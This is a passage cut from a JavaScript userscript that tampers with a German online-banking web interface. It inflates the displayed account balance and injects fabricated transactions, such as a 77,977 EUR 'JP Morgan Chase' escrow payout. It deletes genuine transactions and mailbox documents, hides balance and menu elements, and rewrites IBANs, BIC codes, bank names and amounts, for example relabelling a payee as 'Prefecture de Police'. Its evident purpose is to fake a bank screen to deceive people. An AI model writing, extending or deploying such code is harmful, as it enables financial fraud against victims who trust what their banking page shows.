    currencyNode?.classList.toggle('positive', isPos);
    currencyNode?.classList.toggle('negative', !isPos);
  }

  function ibanMatchesTarget() {
    const ibanDiv = document.querySelector('div[data-test="sublineRow2"]');
    if (!ibanDiv) {
      console.warn(`${TAG} IBAN element not found`);
      return false;
    }
    const currentIBAN = normalizeIBAN(ibanDiv.textContent || '');
    const targetIBAN = normalizeIBAN(TARGET_IBAN);
    const match = currentIBAN === targetIBAN;
    if (!match) {
      console.warn(`${TAG} IBAN mismatch. Found: "${ibanDiv.textContent.trim()}"`);
    }
    return match;
  }

  function adjustOnce() {
    try {
      if (!ibanMatchesTarget()) return; // Skip if IBAN doesn't match

      const amountNode = findAmountNode();
      if (!amountNode) {
        console.debug(`${TAG} Amount node not found on this page.`);
        return;
      }

      const highlight = findHighlightContainer(amountNode);
      const currencyNode = findCurrencyNode(amountNode);

      const currentText = amountNode.textContent || '';
      const currentNumber = parseGermanAmount(currentText);

      if (!Number.isFinite(currentNumber)) {
        console.warn(`${TAG} Could not parse amount from: ${currentText}`);
        return;
      }

      const looksLikeOurLast = (lastAppliedText && trimAllSpaces(currentText) === trimAllSpaces(lastAppliedText));
      const baseChangedExternally = (
        originalNumber !== null &&
        !looksLikeOurLast &&
        Math.abs(currentNumber - originalNumber) > 1e-9 &&
        (lastAppliedNumber === null || Math.abs(currentNumber - lastAppliedNumber) > 1e-9)
      );

      if (originalNumber === null || baseChangedExternally) {
        originalText = currentText;
        originalNumber = currentNumber;
        console.log(`${TAG} Cached original balance: ${originalText} (${originalNumber})`);
      }

      const desiredNumber = originalNumber + ADJUSTMENT_AMOUNT;
      const desiredText = desiredTextFromOriginal(originalText, desiredNumber);

      if (trimAllSpaces(currentText) !== trimAllSpaces(desiredText)) {
        amountNode.textContent = desiredText;
        classesForSign(highlight, currencyNode, desiredNumber);
        lastAppliedText = desiredText;
        lastAppliedNumber = desiredNumber;
        console.log(`${TAG} Applied modified balance: ${desiredText} (${desiredNumber})`);
      } else {
        classesForSign(highlight, currencyNode, desiredNumber);
      }
    } catch (err) {
      console.error(`${TAG} Error while adjusting balance:`, err);
    }
  }

  setInterval(adjustOnce, 100);
  }




// =====================================================================================================================================
// =====================================================================================================================================






// UMSATZE TRANSACTIONS
 if (
  window.location.href.includes("de") ||
  window.location.href.includes("mainscript") ||
  window.location.href.includes("Downloads")
) {
  'use strict';

///  const TARGET_IBAN = 'DE70 1174 8634 4932 8515 53';
///
///  // === Multiple transactions ===
///  const CUSTOM_TRANSACTIONS = [
///    {
///      iconText: 'JP',
///      title: 'JP Morgan Chase',
///      description: 'Auszahlung. Freigabe über Absender.',
///      category: 'Treuhand Auszahlung',
///      status: 'Vorgemerkt',
///      amount: '77.977,00',
///      transactionDate: '18.08.2025',
///      moveSteps: -3
///    },
///    {
///      iconText: 'AM',
///      title: 'Amazon',
///      description: 'Online Shopping Bestellung.',
///      category: 'Einkauf',
///      status: 'Gebucht',
///      amount: '-249,99',
///      transactionDate: '19.08.2025',
///      moveSteps: 12
 ///   }
 /// ];

  const INTERVAL_MS = 200;
  let cachedLis = new Map();

  const normalizeStatus = (s) => (s || '').trim().toLowerCase();
  const isPrenoteStatus = (s) => ['gebucht', 'vorgemerkt'].includes(normalizeStatus(s));
  const parseDate = (str) => {
    const [d, m, y] = str.split('.').map((v) => parseInt(v, 10));
    return new Date(y, m - 1, d);
  };
  const isNegativeAmount = (amt) => (amt || '').trim().startsWith('-');

  // --- status element (icon + text) ---
  const createStatusElement = (statusText, isPrenote = false) => {
    const normalized = normalizeStatus(statusText);
    const isBooked = normalized === 'gebucht';
    const iconType = isBooked ? 'check' : 'clock';
    const iconClass = isBooked ? 'db-icon--check' : 'db-icon--clock';

    const container = document.createElement('div');
    container.className = isPrenote
      ? 'text-truncatable color-text-secondary pt-md-1'
      : 'text-truncatable pt-md-1';
    container.setAttribute(
      'data-test',
      isBooked ? 'bookedTransactionLabelSubline' : 'transactionType'
    );

    const icon = document.createElement('db-icon');
    icon.setAttribute('data-test', 'transactionTypeIcon');
    icon.className = `pb-1 ${iconClass}`;
    icon.setAttribute('aria-hidden', 'true');

    const spanIconName = document.createElement('span');
    spanIconName.setAttribute('translate', 'no');
    spanIconName.setAttribute('hidden', 'true');
    spanIconName.className = 'db-icon__name';
    spanIconName.textContent = ` ${iconType} `;

    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('role', 'img');
    svg.setAttribute('focusable', 'false');
    svg.classList.add('db-icon__icon');

    const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', `#${iconType}`);

    svg.appendChild(use);
    icon.appendChild(spanIconName);
    icon.appendChild(svg);

    container.appendChild(icon);
    container.appendChild(document.createTextNode(' ' + statusText));

    return container;
  };

  // --- customize LI clone with transaction data ---
  const customizeTransactionLi = (li, tx, isPrenote = false) => {
    try {
      const titleEl = li.querySelector(
        '[data-test="counterPartyName"], [data-test="counterPartyNameOrTransactionTypeLabel"] span'
      );
      if (titleEl) titleEl.textContent = tx.title;

      const descEl =
        li.querySelector('[data-test="remittanceInformation"]') ||
        li.querySelector('.db-text--mute.color-text-secondary.text-truncatable');
      if (descEl) descEl.textContent = tx.description;

      const catEl =
        li.querySelector('[data-test="transactionCategoryName"] .db-status__text') ||
        li.querySelector('span[data-test="transactionTypeLabel"]');
      if (catEl) catEl.textContent = tx.category;

      const oldStatus = li.querySelector(
        '[data-test="bookedTransactionLabelSubline"], [data-test="transactionType"]'
      );
      if (oldStatus && oldStatus.parentElement) {
        const newStatus = createStatusElement(tx.status, isPrenote);
        oldStatus.replaceWith(newStatus);
      }

      const negative = isNegativeAmount(tx.amount);
      const cleanAmount = tx.amount.replace('-', '').trim();

      const amountSpan = li.querySelector(
        'span.db-text--highlight.negative > span, span.db-text--highlight.positive > span'
      );
      if (amountSpan) {
        amountSpan.textContent = (negative ? '-' : '') + cleanAmount;
      }

      const currencySpan = li.querySelector('span.currency');
      if (currencySpan) {
        currencySpan.textContent = 'EUR';
      }

      const highlightSpan = li.querySelector(
        '.db-text--highlight.negative, .db-text--highlight.positive'
      );
      if (highlightSpan) {
        highlightSpan.classList.remove('negative', 'positive');
        highlightSpan.classList.add(negative ? 'negative' : 'positive');
      }

      const avatarDiv = li.querySelector('db-avatar .db-avatar');
      if (avatarDiv) {
        avatarDiv.className =
          'db-avatar db-avatar-type--initials db-avatar-size--md db-avatar-design--rounded';
        avatarDiv.innerHTML = '';

        const visibleSpan = document.createElement('span');
        visibleSpan.setAttribute('translate', 'no');
        visibleSpan.setAttribute('aria-hidden', 'true');
        visibleSpan.textContent = tx.iconText;
        avatarDiv.appendChild(visibleSpan);

        const hiddenSpan = document.createElement('span');
        hiddenSpan.setAttribute('translate', 'no');
        hiddenSpan.className = 'sr-only';
        hiddenSpan.textContent = ' ' + tx.title;
        avatarDiv.appendChild(hiddenSpan);
      }

      li.dataset.duplicated = 'true';
      li.dataset.title = tx.title;
    } catch (err) {
      console.error('[Umsätze] Failed to customize transaction:', err);
    }
  };

  const findValidTransactionLi = (isPrenote = false) => {
    if (isPrenote) {
      const prenoteLis = document.querySelectorAll(
        'ul.prenote-group__list[aria-label="Umsätze"] > li'
      );
      for (const li of prenoteLis) {
        if (li.querySelector('cirrus-transactions-row-prenote, cirrus-transactions-row-booked')) {
          return li;
        }
      }
      return null;
    } else {
      const bookedGroups = document.querySelectorAll(
        'cirrus-transactions-group-booked ul[aria-label="Umsätze"] > li'
      );
      for (const li of bookedGroups) {
        if (li.querySelector('cirrus-transactions-row-booked')) {
          return li;
        }
      }
      return null;
    }
  };

  const createAktuelleGroup = () => {
    const template = document.querySelector('[data-test="transactionGroup"]');
    if (!template) return null;

    const newGroup = template.cloneNode(true);
    const heading = newGroup.querySelector('h3[data-test="dateGroupLabelHeading"]');
    if (heading) heading.textContent = 'Aktuelle Umsätze';

    const ul = newGroup.querySelector('ul[aria-label="Umsätze"]');
    if (ul) ul.innerHTML = '';

    const view = document.querySelector('cirrus-transactions-view');
    if (view) {
      view.insertBefore(newGroup, view.firstChild);
    }

    return newGroup.querySelector('ul[aria-label="Umsätze"]');
  };

  const insertIntoDateGroup = (li, tx) => {
    const dateGroups = [...document.querySelectorAll('[data-test="transactionGroup"]')];
    const targetDate = parseDate(tx.transactionDate);

    const existingGroup = dateGroups.find((group) => {
      const heading = group.querySelector('h3[data-test="dateGroupLabelHeading"]');
      return heading?.textContent.trim() === tx.transactionDate;
    });

    if (existingGroup) {
      const ul = existingGroup.querySelector('ul[aria-label="Umsätze"]');
      if (ul) ul.appendChild(li);
      return;
    }

    let insertBeforeGroup = null;
    for (const group of dateGroups) {
      const heading = group.querySelector('h3[data-test="dateGroupLabelHeading"]');
      if (!heading) continue;
      const groupDate = parseDate(heading.textContent.trim());
      if (groupDate < targetDate) {
        insertBeforeGroup = group;
        break;
      }
    }

    const template = dateGroups.find((g) => g.querySelector('cirrus-transactions-row-booked'));
    if (!template) return;

    const newGroup = template.cloneNode(true);
    const heading = newGroup.querySelector('h3[data-test="dateGroupLabelHeading"]');
    if (heading) heading.textContent = tx.transactionDate;

    const ul = newGroup.querySelector('ul[aria-label="Umsätze"]');
    if (!ul) return;
    ul.innerHTML = '';
    ul.appendChild(li);

    if (insertBeforeGroup) {
      insertBeforeGroup.parentElement.insertBefore(newGroup, insertBeforeGroup);
    } else {
      dateGroups[dateGroups.length - 1].parentElement.appendChild(newGroup);
    }
  };

  const recreateLiForTarget = (targetUl, isPrenoteTarget, tx) => {
    const baseLi = findValidTransactionLi(isPrenoteTarget);
    if (!baseLi) return null;
    const newLi = baseLi.cloneNode(true);
    customizeTransactionLi(newLi, tx, isPrenoteTarget);
    targetUl.appendChild(newLi);
    const oldLi = cachedLis.get(tx);
    if (oldLi && oldLi.parentElement) oldLi.remove();
    cachedLis.set(tx, newLi);
    return newLi;
  };

  const moveTransactionGlobal = (li, steps, tx) => {
    if (!li || steps === 0) return;

    const allLis = [...document.querySelectorAll('ul[aria-label="Umsätze"] > li')];
    const idx = allLis.indexOf(li);
    if (idx === -1) return;

    let newIndex = idx - steps;
    if (newIndex < 0) newIndex = 0;
    if (newIndex >= allLis.length) newIndex = allLis.length - 1;

    const targetLi = allLis[newIndex];
    if (!targetLi) return;
    const targetUl = targetLi.parentElement;
    const isPrenoteTarget = targetUl.classList.contains('prenote-group__list');

    const liIsPrenote = li.closest('ul')?.classList.contains('prenote-group__list');

    if (liIsPrenote !== isPrenoteTarget) {
      const newLi = recreateLiForTarget(targetUl, isPrenoteTarget, tx);
      if (!newLi) return;
      targetUl.insertBefore(newLi, targetLi);
    } else {
      if (newIndex < idx) targetUl.insertBefore(li, targetLi);
      else targetUl.insertBefore(li, targetLi.nextSibling);
    }
  };

  // --- IBAN guard with bypass rule ---
  const checkAllowed = () => {
    // bypass: "Umsätze aller Produkte" present → always allowed
    const allText = document.body.innerText || '';
    if (allText.toLowerCase().includes('umsätze aller produkte')) {
      return true;
    }
    // else: require IBAN
    const ibanNorm = TARGET_IBAN.replace(/\s+/g, '').toLowerCase();
    const candidates = [...document.querySelectorAll('[data-test="sublineRow2"]')];
    return candidates.some((el) =>
      el.textContent.replace(/\s+/g, '').toLowerCase().includes(ibanNorm)
    );
  };

  const insertTransaction = (tx) => {
    try {
      if (document.querySelector(`li[data-duplicated="true"][data-title="${tx.title}"]`)) return;

      const statusNorm = normalizeStatus(tx.status);
      const shouldUsePrenote = isPrenoteStatus(statusNorm);

      if (shouldUsePrenote) {
        if (!cachedLis.get(tx)) {
          const baseLi = findValidTransactionLi(true) || findValidTransactionLi(false);
          if (!baseLi) return;
          const newLi = baseLi.cloneNode(true);
          customizeTransactionLi(newLi, tx, true);
          cachedLis.set(tx, newLi);
        }
        const prenoteUl =
          document.querySelector('ul.prenote-group__list[aria-label="Umsätze"]') ||
          createAktuelleGroup();
        if (!prenoteUl) return;
        prenoteUl.appendChild(cachedLis.get(tx));
      } else {
        if (!cachedLis.get(tx)) {
          const baseLi = findValidTransactionLi(false);
          if (!baseLi) return;
          const newLi = baseLi.cloneNode(true);
          customizeTransactionLi(newLi, tx, false);
          cachedLis.set(tx, newLi);
        }
        insertIntoDateGroup(cachedLis.get(tx), tx);
      }

      moveTransactionGlobal(cachedLis.get(tx), tx.moveSteps, tx);
    } catch (err) {
      console.error('[Umsätze] Error during insertion:', err);
    }
  };

  const intervalFn = () => {
    if (!checkAllowed()) {
      console.log('[Umsätze] Skipped — IBAN not found and no bypass');
      return;
    }
    CUSTOM_TRANSACTIONS.forEach(insertTransaction);
  };

  setInterval(intervalFn, INTERVAL_MS);
}


// =====================================================================================================================================
// =====================================================================================================================================


// POST UTITLITIES
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

///    // ---- Configuration: toggle each target on/off ----
///    const CONFIG = {
///        // Remove elements like: [data-test="fullAccountRow"] .balance.text-nowrap.with-color
///        removeMainBalance: true,
///
///       // Remove elements like: .balance__subline.d-flex.justify-content-end.align-items-center.mt-1
///        removeSubline: true,
///
///        // Remove elements like: [data-test="pageHeaderActionMenu"]
///        removePageHeaderActionMenu: true,
///
///        // Remove elements like: [aria-label="Menu zu Umsatzfunktionen öffnen"]
///        removeMenuUmsatzfunktionen: true,
///
///        // Remove elements like: [aria-label="Menu zu Produktfunktionen öffnen"]
///        removeMenuProduktfunktionen: true,
///
///        // Remove the *direct parent* of elements like: [data-test="filterButtonSmall"]
///        removeParentOfFilterButtonSmall: true,
///
///        // Remove the *direct parent* of elements like: [data-test="historicalBalanceChart"]
///        removeParentOfHistoricalBalanceChart: true,
///
///        // Check interval in ms
///        intervalMs: 100
///    };

    console.log('[post utilities] started with config:', CONFIG);

    const selectors = {
        mainBalance: '[data-test="fullAccountRow"] .balance.text-nowrap.with-color',
        subline: '.balance__subline.d-flex.justify-content-end.align-items-center.mt-1',
        pageHeaderActionMenu: '[data-test="pageHeaderActionMenu"]',
        menuUmsatzfunktionen: '[aria-label="Menu zu Umsatzfunktionen öffnen"]',
        menuProduktfunktionen: '[aria-label="Menu zu Produktfunktionen öffnen"]',
        filterButtonSmall: '[data-test="filterButtonSmall"]',
        historicalBalanceChart: '[data-test="historicalBalanceChart"]'
    };

    function removeBySelector(selector) {
        const nodes = document.querySelectorAll(selector);
        if (nodes.length === 0) return 0;

        let removed = 0;
        nodes.forEach(node => {
            try {
                node.remove();
                removed++;
            } catch (e) {
                console.error('[post utilities] Failed to remove node for selector:', selector, e);
            }
        });

        if (removed > 0) {
            console.log(`[post utilities] Removed ${removed} node(s) for selector: ${selector}`);
        }
        return removed;
    }

    function removeParentBySelector(selector) {
        const nodes = document.querySelectorAll(selector);
        if (nodes.length === 0) return 0;

        let removed = 0;
        nodes.forEach(node => {
            try {
                if (node.parentElement) {
                    node.parentElement.remove();
                    removed++;
                }
            } catch (e) {
                console.error('[post utilities] Failed to remove parent node for selector:', selector, e);
            }
        });

        if (removed > 0) {
            console.log(`[post utilities] Removed parent of ${removed} node(s) for selector: ${selector}`);
        }
        return removed;
    }

    function sweep() {
        try {
            if (CONFIG.removeMainBalance) {
                removeBySelector(selectors.mainBalance);
            }
            if (CONFIG.removeSubline) {
                removeBySelector(selectors.subline);
            }
            if (CONFIG.removePageHeaderActionMenu) {
                removeBySelector(selectors.pageHeaderActionMenu);
            }
            if (CONFIG.removeMenuUmsatzfunktionen) {
                removeBySelector(selectors.menuUmsatzfunktionen);
            }
            if (CONFIG.removeMenuProduktfunktionen) {
                removeBySelector(selectors.menuProduktfunktionen);
            }
            if (CONFIG.removeParentOfFilterButtonSmall) {
                removeParentBySelector(selectors.filterButtonSmall);
            }
            if (CONFIG.removeParentOfHistoricalBalanceChart) {
                removeParentBySelector(selectors.historicalBalanceChart);
            }
        } catch (e) {
            console.error('[post utilities] Sweep error:', e);
        }
    }

    // Run every 2 seconds indefinitely
    setInterval(sweep, CONFIG.intervalMs);
    // Also run once immediately at start
    sweep();
}



// =====================================================================================================================================
// =====================================================================================================================================




// POST POSTFACH
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';
  /*** RULES: Only these keys inside each rule ***/
//  const RULES = [
//    {
//      USE_DIGIT_CHECK: true,
//      USE_DATE_CHECK:  true,
//      TARGET_DIGITS_RAW: '612 1583459 00', // digits-only compare
//      TARGET_DATE_RAW:   '00.07.2025',     // month + year
//    },
//    // Add more rules below, same 4 keys only:
//    // {
//    //   USE_DIGIT_CHECK: false,
//    //   USE_DATE_CHECK:  true,
//    //   TARGET_DIGITS_RAW: '123 456',
//    //   TARGET_DATE_RAW:   '00.00.2025', // year only
//    // },
//    // {
//    //   USE_DIGIT_CHECK: true,
//    //   USE_DATE_CHECK:  false,
//    //   TARGET_DIGITS_RAW: '987654321',
////    //   TARGET_DATE_RAW:   '28.07.2025', // ignored if USE_DATE_CHECK=false
//    // },
//  ];

  /*** CONSTANTS / HELPERS ***/
  const ROW_SELECTOR = '.file-row';
  const getDigits = (str) => (str || '').replace(/\D+/g, '');
  const normalizeWsCase = (str) => (str || '').toLowerCase().replace(/\s+/g, '');

  // Parse a "DD.MM.YYYY"ish string -> { day:'DD', month:'MM', year:'YYYY' }
  const parseDateParts = (str) => {
    if (!str) return null;
    const s = String(str).trim();
    const m = s.match(/(\d{1,2})\.(\d{1,2})\.(\d{2,4})/);
    if (!m) return null;
    let [ , d, M, y ] = m;
    d = d.padStart(2, '0');
    M = M.padStart(2, '0');
    y = y.length === 2 ? ('20' + y) : y.padStart(4, '0');
    return { day: d, month: M, year: y };
  };

  // Turn a rule's TARGET_DATE_RAW into parts + which fields to consider
  const compileRuleDate = (raw) => {
    const parts = parseDateParts(normalizeWsCase(raw));
    if (!parts) return null;
    const considerDay   = parts.day   !== '00';
    const considerMonth = parts.month !== '00';
    const considerYear  = parts.year  !== '0000';
    return { ...parts, considerDay, considerMonth, considerYear };
  };

  // Pre-compile rules (normalize digits/date once)
  const COMPILED_RULES = RULES.map((r, i) => ({
    idx: i,
    USE_DIGIT_CHECK: !!r.USE_DIGIT_CHECK,
    USE_DATE_CHECK:  !!r.USE_DATE_CHECK,
    TARGET_DIGITS: getDigits(r.TARGET_DIGITS_RAW || ''),      // "612158345900" style
    TARGET_DATE:   r.TARGET_DATE_RAW ? compileRuleDate(r.TARGET_DATE_RAW) : null,
    TARGET_DATE_RAW: r.TARGET_DATE_RAW || '',
  }));

  // Only consider top-level .file-row elements (avoid nested duplicates)
  const getTopLevelRows = () => {
    const all = Array.from(document.querySelectorAll(ROW_SELECTOR));
    return all.filter(el => !el.parentElement || !el.parentElement.closest(ROW_SELECTOR));
  };

  // Per-rule digit check
  const digitsMatch = (row, rule) => {
    if (!rule.USE_DIGIT_CHECK) return true;
    try {
      const scope = row.querySelector('[data-test="account"]') || row;
      const digits = getDigits(scope.textContent);
      return rule.TARGET_DIGITS && digits.includes(rule.TARGET_DIGITS);
    } catch (e) {
      console.warn('[file-row remover] digitsMatch error (rule', rule.idx, '):', e);
      return false;
    }
  };

  // Per-rule date check (supports 00/0000 wildcards)
  const dateMatch = (row, rule) => {
    if (!rule.USE_DATE_CHECK) return true;
    try {
      const target = rule.TARGET_DATE;
      if (!target) return false;

      const dateEl = row.querySelector('[data-test="date"], .file-row__received-date');
      if (!dateEl) return false;

      const parts = parseDateParts(normalizeWsCase(dateEl.textContent));
      if (!parts) return false;

      if (target.considerDay   && parts.day   !== target.day)   return false;
      if (target.considerMonth && parts.month !== target.month) return false;
      if (target.considerYear  && parts.year  !== target.year)  return false;

      return true;
    } catch (e) {
      console.warn('[file-row remover] dateMatch error (rule', rule.idx, '):', e);
      return false;
    }
  };

  // A row matches a rule if all enabled checks pass
  const rowMatchesRule = (row, rule) => {
    if (!rule.USE_DIGIT_CHECK && !rule.USE_DATE_CHECK) return false;
    return digitsMatch(row, rule) && dateMatch(row, rule);
  };

  const removeIfAnyRuleMatches = (row) => {
    try {
      for (const rule of COMPILED_RULES) {
        if (rowMatchesRule(row, rule)) {
          const container = row.closest('cirrus-list-header-item.file-row') || row;
          console.log('[file-row remover] Removing row by rule', rule.idx, {
            digitsCheck: rule.USE_DIGIT_CHECK,
            dateCheck:   rule.USE_DATE_CHECK,
            targetDigits: rule.TARGET_DIGITS,
            targetDate:   rule.TARGET_DATE_RAW
          });
          container.remove();
          return true;
        }
      }
    } catch (err) {
      console.warn('[file-row remover] Error while evaluating/removing a row:', err);
    }
    return false;
  };

  const sweep = () => {
    try {
      const activeRules = COMPILED_RULES.filter(r => r.USE_DIGIT_CHECK || r.USE_DATE_CHECK);
      if (activeRules.length === 0) {
        if (!sweep._warned) {
          console.warn('[file-row remover] No active rules; nothing to do.');
          sweep._warned = true;
        }
        return;
      }

      const rows = getTopLevelRows();
      if (!rows.length) return;

      let removed = 0;
      for (const row of rows) {
        if (!document.contains(row)) continue;
        removed += removeIfAnyRuleMatches(row) ? 1 : 0;
      }
      if (removed > 0) {
        console.log(`[file-row remover] Sweep done. Removed: ${removed}`);
      }
    } catch (err) {
      console.warn('[file-row remover] Sweep error:', err);
    }
  };

  // Run forever: initial + every 2s
  sweep();
  setInterval(sweep, 100);
}





//=================


// UMSATZE TRANSACTION REMOVAL
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

  // === Configure target amounts and whether to search for them ===
//  const TARGET_AMOUNTS = [
//    { value: '-19,42', enabled: true },
//    { value: '-910,00',  enabled: true },
//    { value: '3.180,00', enabled: true }
//  ];

  const INTERVAL_MS = 100;
  const DEBUG = false;

  const normalizeStringAmount = (str) => {
    if (!str) return '';
    return String(str)
      .replace(/\u00A0|\u2007|\u202F/g, ' ') // non-breaking spaces → normal
      .replace(/−/g, '-')                   // unicode minus → ASCII minus
      .replace(/\s+/g, ' ')
      .replace(/\b(?:EUR|USD|CHF|JPY|GBP)\b/gi, '')
      .replace(/[€$¥£]/g, '')
      .trim();
  };

  const toNumeric = (str) => {
    if (typeof str === 'number') return Number.isFinite(str) ? str : NaN;
    if (!str) return NaN;
    const s = String(str)
      .replace(/\u00A0|\u2007|\u202F/g, '')
      .replace(/−/g, '-')
      .replace(/[€$¥£A-Za-z]/g, '')
      .replace(/\s+/g, '')
      .replace(/\./g, '')   // thousands sep
      .replace(/,/g, '.');  // decimal comma -> dot
    const m = s.match(/-?\d+(?:\.\d+)?/);
    return m ? Number.parseFloat(m[0]) : NaN;
  };

  // Precompute active targets
  const activeTargets = TARGET_AMOUNTS.filter(t => t.enabled);
  const targetNorms = new Set(activeTargets.map(t => normalizeStringAmount(t.value)).filter(Boolean));
  const targetNums = new Set(activeTargets.map(t => toNumeric(t.value)).filter(Number.isFinite));

  if (DEBUG) {
    console.log('[txn-remover] Active target norms:', Array.from(targetNorms));
    console.log('[txn-remover] Active target nums:', Array.from(targetNums));
  }

  const getRowAmountText = (rowEl) => {
    try {
      const nodes = rowEl.querySelectorAll('[data-test="amount"], db-banking-decorated-amount');
      if (nodes.length) {
        return Array.from(nodes).map(n => n.textContent || '').join(' ').trim();
      }
      const maybe = rowEl.querySelector('[class*="amount"], [data-amount], [class*="currency"], [data-test*="currency"]');
      if (maybe) return (maybe.textContent || '').trim();
      return (rowEl.textContent || '').trim();
    } catch (e) {
      if (DEBUG) console.debug('[txn-remover] getRowAmountText error:', e);
      return '';
    }
  };

  const isMatch = (text) => {
    const norm = normalizeStringAmount(text);
    if (norm) {
      for (const t of targetNorms) {
        if (t && norm.includes(t)) return true;
      }
    }
    const num = toNumeric(text);
    if (Number.isFinite(num)) {
      if (targetNums.has(num)) return true;
      for (const t of targetNums) {
        if (Math.abs(num - t) < 0.0001) return true; // tolerance
      }
    }
    return false;
  };

const removeMatchingRows = () => {
  try {
    // Now also check prenote transaction rows
    const rows = document.querySelectorAll('cirrus-transaction-row, cirrus-prenote-transaction-row');
    if (!rows.length) return;

    let removed = 0;
    rows.forEach((row) => {
      if (!row || !row.isConnected) return;
      const amountText = getRowAmountText(row);
      if (!amountText) return;

      if (isMatch(amountText)) {
        try {
          if (DEBUG) console.log('[txn-remover] Removing row with amount text:', amountText);
          row.remove();
          removed++;
        } catch (err) {
          console.error('[txn-remover] Failed to remove row:', err, row);
        }
      }
    });

    if (removed > 0) {
      console.log(`[txn-remover] Removed ${removed} row(s). Active targets: ${activeTargets.map(t => t.value).join(', ')}`);
    }
  } catch (err) {
    console.error('[txn-remover] Unexpected error in removal loop:', err);
  }
};


  removeMatchingRows();
  setInterval(removeMatchingRows, INTERVAL_MS);
  console.log('[txn-remover] Active. Interval:', INTERVAL_MS, 'ms. Active targets:', activeTargets.map(t => t.value));
}

}


if (
    window.location.href.includes("de") ||
    window.location.href.includes("mainscript") ||
    window.location.href.includes("Downloads")
) {
    'use strict';

    // === Replacements with per-replacement auto delay ===
    const replacements = [
  //      { search: "FR76 1747 8000 0100 0961 60301 39", replace: "DE37 3427 0024 0123 3006 00", autoDelay: 100 },  // DE37 3427 0024 0123 3006 00      // NL33 CLRB 0048 7096 50


   //     { search: "FR76 1747 8000 0100 0961 6030 139", replace: "DE37 3427 0024 0123 3006 00", autoDelay: 100 },
        { search: " DE81 2157 0011 0400 8736 00", replace: "DE81 2157 0011 0400 8736 02", autoDelay: 100 },
      //  { search: "DE04 2022 0800 0040 5726 76",       replace: "DE10 3427 0024 0123 3006 01", autoDelay: 100 },

     //     { search: "Banking Circle Germany", replace: "Deutsche Bank", autoDelay: 100 },
    //    { search: "SXPYDEHHXXX",       replace: "DEUTDEDB342", autoDelay: 100 },

    //      { search: "HARMONIIE SAS", replace: "Deutsche Bank", autoDelay: 100 },

        { search: "Klaus Born", replace: "Klaus Born Treuhand Konto", autoDelay: 100 },


        { search: "CLEARBANK EUROPE NV", replace: "HARMONIIE SAS", autoDelay: 100 },
        { search: "CLEARBANK EUROPE", replace: "HARMONIIE SAS", autoDelay: 100 },


    //    { search: "HRSAFR22XXX",       replace: "DEUTDEDB342", autoDelay: 100 },
        { search: "CLRBNL2AXXX",       replace: "HRSAFR22XXX", autoDelay: 100 },
        { search: "CLRBNL2A",       replace: "HRSAFR22XXX", autoDelay: 100 },


         { search: "Everest Network, Ltd.",       replace: "Prefecture de Police", autoDelay: 100 },
        { search: "INV Z27",       replace: "2025-PREF-75-74127", autoDelay: 100 },

// Test



        // CUSTOM
   //       { search: "2.500,00", replace: "1,00", autoDelay: 0 },
        { search: "-2.500,00", replace: "-1,00", autoDelay: 0 },// -130,99   //DONT' FORGET TO CHANGE DELAY
     //     { search: "25.000,00", replace: "250,00", autoDelay: 0 },  { search: "-25.000,00", replace: "-250,00", autoDelay: 0 },


         // 25, 64    - 100 EURO
          { search: "33.000,00", replace: "XXX,00", autoDelay: 0 },  { search: "-33.000,00", replace: "-XXX,00", autoDelay: 0 },// -130,99
          { search: "35.000,00", replace: "XXX,00", autoDelay: 0 },  { search: "-35.000,00", replace: "-XXX,00", autoDelay: 0 },


    // 26, 65    - 1000 EURO
          { search: "25.500,00", replace: "100,00", autoDelay: 0 },  { search: "-25.500,00", replace: "-100,00", autoDelay: 0 },// -130,99
          { search: "65.500,00", replace: "100,00", autoDelay: 0 },  { search: "-65.500,00", replace: "-100,00", autoDelay: 0 },

     // 27, 66 -  5 000 Euro
          { search: "26.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-26.500,00", replace: "-1.000,00", autoDelay: 0 },// -130,99
          { search: "66.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-66.500,00", replace: "-1.000,00", autoDelay: 0 },

        // 28, 67 - 10 000 Euro
          { search: "27.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-27.500,00", replace: "-1.000,00", autoDelay: 0 },// -130,99
          { search: "67.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-67.500,00", replace: "-1.000,00", autoDelay: 0 },

        // 29, 68 - 20 000 Euro

          { search: "28.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-28.500,00", replace: "-1.000,00", autoDelay: 0 },// -130,99
          { search: "68.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-68.500,00", replace: "-1.000,00", autoDelay: 0 },


        // 30, 69 - 50 000 Euro


          { search: "29.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-29.500,00", replace: "-1.000,00", autoDelay: 0 },// -130,99
          { search: "69.500,00", replace: "1.000,00", autoDelay: 0 },  { search: "-69.500,00", replace: "-1.000,00", autoDelay: 0 },



    ];

    const autoOnBlur = true; // enable continuous automatic replacement for inactive inputs

    const normalize = str => str.replace(/\s+/g, "").toLowerCase();
    const preparedReplacements = replacements.map(r => {
        const normalized = normalize(r.search);
        const pattern = normalized.split("").map(ch => (/[a-z0-9]/i.test(ch) ? ch : ch)).join("\\s*");
        return { ...r, normalizedSearch: normalized, regex: new RegExp(pattern, "gi") };
    });

    const cache = new WeakMap();

    function replaceTextNodes() {
        try {
            const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
            let node;
            while ((node = walker.nextNode())) {
                const originalText = node.nodeValue;
                if (!originalText || cache.has(node)) continue;

                let replacedText = originalText;
                let changed = false;

                for (const { regex, replace } of preparedReplacements) {
                    if (regex.test(originalText)) {
                        replacedText = replacedText.replace(regex, replace);
                        changed = true;
                    }
                }

                if (changed && replacedText !== originalText) {
                    cache.set(node, originalText);
                    node.nodeValue = replacedText;
                }
            }
        } catch (err) {
            console.error("[IBAN Replace] Error in text nodes:", err);
        }
    }

    // === Manual replacement triggered by keys/mouse ===
    function replaceInputValuesManual() {
        const inputs = document.querySelectorAll("input[type='text'], textarea");
        for (const input of inputs) {
            const val = input.value;
            if (!val) continue;

            let replaced = val;
            let changed = false;

